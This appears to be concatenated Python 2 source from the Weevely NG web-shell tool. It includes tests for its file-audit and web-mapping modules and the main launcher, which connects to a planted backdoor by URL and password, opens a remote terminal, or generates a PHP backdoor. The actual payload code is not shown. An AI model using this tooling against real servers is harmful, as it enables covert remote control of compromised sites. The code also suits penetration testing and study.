        self.assertDictContainsSubset(expected_enum_map, self._res(":audit.userfiles -pathfile %s" % temp_path.name))

        temp_path.close()
      
        print 'Remember to restore \'%s\' permission to \'700\'' % conf['permtest_home_path']
########NEW FILE########
__FILENAME__ = test_webmap
from baseclasses import SimpleTestCase, FolderFSTestCase
from test import conf
import os, sys
sys.path.append(os.path.abspath('..'))
import modules


class WebMap(SimpleTestCase):
    
    
    @classmethod
    def _setenv(cls):    
        FolderFSTestCase._setenv.im_func(cls)
        
        cls._env_newfile('web_page1.html', content=conf['web_page1_content'])
        cls._env_newfile('web_page2.html', content=conf['web_page2_content'])
        cls._env_newfile('web_page3.html', content=conf['web_page3_content'])

    def test_mapweb(self):
        
        web_page1_relative_path = os.path.join(self.basedir.replace(conf['env_base_web_dir'],''), 'web_page1.html')
        web_page1_url = '%s%s' %  (conf['env_base_web_url'], web_page1_relative_path)
        web_base_url = '%s%s' %  (conf['env_base_web_url'], self.basedir.replace(conf['env_base_web_dir'],''))
        
        webmap1 = { os.path.join(self.basedir, 'web_page1.html'): ['exists', 'readable', 'writable', ''] }
        webmap2 = { os.path.join(self.basedir, 'web_page2.html'): ['exists', 'readable', 'writable', ''] }
        webmap3 = { os.path.join(self.basedir, 'web_page3.html'): ['exists', 'readable', 'writable', ''] }
        
        webmap = webmap1.copy(); webmap.update(webmap2); webmap.update(webmap3)
        webmap_first_two = webmap1.copy(); webmap_first_two.update(webmap2);

        self.assertEqual(self._res(':audit.mapwebfiles %s %s %s' % (web_page1_url, web_base_url, self.basedir)), webmap)
        self.assertEqual(self._res(':audit.mapwebfiles %s %s %s -depth 0' % (web_page1_url, web_base_url, self.basedir)), webmap_first_two)

        
        self.assertRegexpMatches(self._warn(':audit.mapwebfiles %s_unexistant.html %s %s' % (web_page1_url, web_base_url, self.basedir)), modules.audit.mapwebfiles.WARN_CRAWLER_NO_URLS)

        web_page1_badurl = 'http://localhost:90/%s' %  (web_page1_relative_path)
        self.assertRegexpMatches(self._warn(':audit.mapwebfiles %s %s %s' % (web_page1_badurl, web_base_url, self.basedir)), modules.audit.mapwebfiles.WARN_CRAWLER_NO_URLS)


########NEW FILE########
__FILENAME__ = weevely
#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


from core.terminal import Terminal, module_trigger, help_string
from core.modulehandler import ModHandler
from core.moduleexception import ModuleException
from core.helper import banner, credits, usage

import sys
import os



if __name__ == "__main__":



    if len(sys.argv) >= 3 and (sys.argv[1].startswith('http') or sys.argv[1] == 'session'):         
        
        url = None
        password = None
        sessionfile = None

        if sys.argv[1].startswith('http'):
            url = sys.argv[1]
            password = sys.argv[2]
        else:
            sessionfile = sys.argv[2]

        try:
            
            module_handler = ModHandler(url=url, password=password, sessionfile=sessionfile)
            
            if len(sys.argv) == 3:     
                Terminal (module_handler).loop()
            else:
                Terminal(module_handler).run_cmd_line(sys.argv[3:])
    
        except ModuleException, e:
            print '[%s] [!] %s ' % (e.module, e.error)
        except (KeyboardInterrupt, EOFError):
            print '\n[!] Exiting. Bye ^^'



    elif len(sys.argv) >= 3 and sys.argv[1].startswith('generate'):

        genname = sys.argv[1]
        password = sys.argv[2]

        if genname == 'generate':
            genname = 'generate.php' 

        try:
            Terminal (ModHandler()).run_cmd_line([':%s' % genname ] + sys.argv[2:])
        except ModuleException, e:
            print '[!] [%s] %s ' % (e.module, e.error)

    elif len(sys.argv) >= 2 and sys.argv[1] == 'help':
        Terminal (ModHandler()).run_cmd_line([':help' ] + sys.argv[2:])



    elif len(sys.argv)==2 and sys.argv[1] == 'credits':
        print credits


    else:
        print banner, usage 



########NEW FILE########
